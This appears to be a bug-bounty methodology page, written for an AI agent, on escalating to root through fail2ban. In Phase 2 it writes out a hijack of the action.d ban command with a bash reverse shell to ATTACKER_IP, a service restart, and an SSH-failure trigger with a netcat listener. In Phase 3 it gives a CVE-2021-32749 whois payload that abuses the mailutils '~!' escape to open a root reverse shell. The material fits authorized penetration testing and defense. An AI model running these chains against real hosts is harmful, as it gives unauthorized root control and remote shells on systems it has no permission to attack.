---
technology: "fail2ban"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "corpus-grounded (command-context gate, internal coverage ledger) + upstream-verified: fail2ban jail.conf(5) man page (action.d [Definition] commands executed through a system shell as root; jail.conf/jail.d/jail.local precedence; banaction default iptables-multiport), CVE-2021-32749 / GHSA-m985-3f3v-cwmm (mailutils ~! escape via whois output in mail actions; <=0.9.7, 0.10.0-0.10.6, 0.11.0-0.11.2; fixed 0.10.7/0.11.3), whois.conf(5) (/usr/local/etc/whois.conf server override), 2026-11-12"
provenance: "corpus-grounded: 4 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

Companion page: [[fail2ban|fail2ban overview]] — what this daemon is and why it is a privilege-escalation surface. Tool notes live in the tools vault; Appendix A names tools in prose.

# fail2ban bug bounty methodology

**Scope:** Linux hosts running fail2ban, as a privilege-escalation surface from an unprivileged shell (config-write + restart chains, mail-action injection) and as an operational factor during any engagement (jails, bans, ban-state leaks). **Out of scope:** firewall misconfigurations not driven by fail2ban, and remote jail-regex evasion as a standalone finding.

**Authorization:** these chains end in root command execution on a production host. Demonstrate with a benign callback or a marker file, not a persistent implant, and never test the ban-trigger machinery against services outside scope — the trigger *is* an auth-failure flood.

## Decision tree (one screen)

1. Shell on host → Phase 1 (confirm daemon, read jails/actions — all world-readable).
2. Writable action.d (file or directory) + restart rights → Phase 2 (actionban RCE chain).
3. Mailing action with whois output + vulnerable version → Phase 3 (mailutils `~!` injection).
4. No write rights anywhere → Phase 4 (operational posture: ban triggers, ban-state leaks).
5. Root obtained → standard post-exploitation; re-arm nothing.

## Phase 1 — Confirm the daemon and read its posture

```bash
ps aux | grep -i fail2ban          # or: systemctl status fail2ban
cat /var/log/fail2ban.log | tail   # jail names, recent bans (readable by group/log readers)
ls -la /etc/fail2ban               # ownership of the config tree is the whole question
ls -l  /etc/fail2ban/action.d
cat /etc/fail2ban/jail.local       # enabled jails, action=, banaction=, mta=
sudo -l                            # restart rights: init.d / systemctl / fail2ban-client
```

- Record three things per host: which actions are live for the enabled jails, who can write action.d (files AND the directory itself), and whether any sudoers rule restarts the service.
- `action = %(action_mwl)s` or `action = mail-whois` lines with `mta = mail` mark the Phase 3 population; the sshd jail is enabled by default on Debian-family installs.

## Phase 2 — Writable action.d + restart rights → root on next ban

The actionban command runs through a system shell as root when any IP is banned. File not writable but directory is? Replace it:

```bash
cd /etc/fail2ban/action.d
mv iptables-multiport.conf .old            # needs directory write, not file write
cp .old iptables-multiport.conf            # your copy, your ownership
# edit [Definition] actionban:
#   actionban = /tmp/ban.sh <ip>
printf '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1\n' > /tmp/ban.sh
chmod +x /tmp/ban.sh
sudo /etc/init.d/fail2ban restart          # or: sudo systemctl restart fail2ban
```

Trigger the ban you just armed (against a jail you are allowed to hit):

```bash
ssh validuser@example.com                  # wrong password, maxretry times
nc -lvnp 1337                              # root shell on the next ban cycle
```

- Variants: a writable `jail.local`/`jail.d/*.local` entry can point `action` at any action file name you then create; a writable filter.d file is weaker (no execution) but tunes what trips.
- If restart rights are absent, the modified action still fires on the *next* daemon restart (patch window, reboot) — a persistence statement, not an immediate finding; report it as such.
- Cleanup discipline: restore the original action file; every subsequent legitimate ban would otherwise execute your line.

## Phase 3 — Mail-action injection (CVE-2021-32749)

Conditions (each visible in config): a mailing action that embeds `whois <ip>` output (`action_mwl`, `mail-whois`), `mta` resolving to mailutils' `mail`, and an unpatched release (through 0.9.7, 0.10.0–0.10.6, 0.11.0–0.11.2; fixed 0.10.7 and 0.11.3). mailutils' `mail` interprets `~! command` escape sequences when composing — the whois response is the message body, so whois control is root command execution at ban time.

Control the whois response by redirecting the query for *your* source IP to a server you run. The whois client consults `/usr/local/etc/whois.conf` (pattern → server) before built-in servers:

```bash
# plant the override with whatever write primitive you hold on the host:
#   /usr/local/etc/whois.conf containing:
#   ATTACKER_SOURCE_IP   ATTACKER_IP
# serve the payload on port 43 (ncat drops the connection after the reply, like a real whois):
printf 'x\n~! bash -c "bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1"\n' | sudo ncat -lnvp 43
# then trip the jailed service; the ban mails your "whois output"; mail runs ~! as root
```

- No file-write primitive? whois-server control also works via MITM of the outbound query or answering for a whois server you legitimately operate — the advisory's original threat model.
- Report framing: high-ac complexity by design (CVSS reflects it) — your value is demonstrating each precondition with evidence.

## Phase 4 — Operational posture (no write rights)

- **Do not ban yourself out of scope:** know `maxretry`/`findtime`/`bantime` from jail.local before spraying; bans outlive your tool's patience, and unban needs root (`fail2ban-client set <jail> unbanip <ip>`).
- **Ban state is recon:** `/var/log/fail2ban.log` shows which services are actively under attack (other attackers' IPs are free intel), and `ipset list` / `iptables -L -n` reveal the ban backend and rule shape; root jobs sometimes export ban lists into web roots or archives — those exports leak both attacker IPs and deployment structure.
- **Filter quirks:** jail filters are regexes over specific log formats; version drift between the service's log format and the shipped filter silently disables jailing (a hardening claim you can falsify by testing one deliberate failure within scope rules).

## Command quick reference

```bash
ls -la /etc/fail2ban/action.d                      # write rights on files/dir
sudo -l | grep -iE 'fail2ban|systemctl'            # restart half of the chain
cat /etc/fail2ban/jail.local                       # actions, mta, jail enablement
grep -r actionban /etc/fail2ban/action.d/*.conf    # the root command lines
sudo fail2ban-client status; ... status sshd       # live jails and banned IPs
ipset list | grep -A7 f2b                          # ban store (ipset backend)
```

## Appendix A — Tools in prose

Service and config enumeration with plain shell utilities (ps, systemctl, ls, grep, sudo -l); payload delivery with netcat/ncat listeners and `ssh` clients for the deliberate failure trigger; whois redirection with a local ncat one-liner on port 43 or a real whois responder; version identification from package managers (apt/dpkg, yum/rpm) against the upstream advisory. No exploit framework is required — every chain here is configuration plus a listener.
